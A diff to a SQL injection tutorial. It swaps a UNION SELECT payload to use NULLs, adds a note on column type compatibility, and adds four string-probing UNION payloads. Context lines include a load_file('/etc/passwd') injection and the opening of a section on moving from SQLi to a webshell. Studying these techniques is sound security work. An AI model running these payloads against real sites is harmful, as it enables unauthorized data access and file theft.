@@ -53,8 +53,18 @@ After detect that the application is vulnerable to SQLi we need to know how many
 Now that we know how many columns are in the table, we can use this information to retrieve information. But we need to before understand where this information will be displayed, so we are going to set parameteres to that fields.
 
 ```
-/index.php?id=1 union all select 1, 2, 3
+/index.php?id=1 union all select NULL, NULL, NULL
 ```
+
+> **Note**: The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every commonly used data type.
+
+```
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+```
+If the data type of a column is not compatible with string data, the injected query will cause a database error.
 
 ## Extracting Data from Database
 
@@ -76,7 +86,7 @@ Some databases allows us to read or write files in the filesystem.
 /index.php?id=1 union all select 1, 2, load_file('/etc/passwd')
 ```
 
-## From SQLi to RCE
+# From SQLi to RCE
 
 Since we are allowed to upload files, we can upload a webshell to the web root.
 
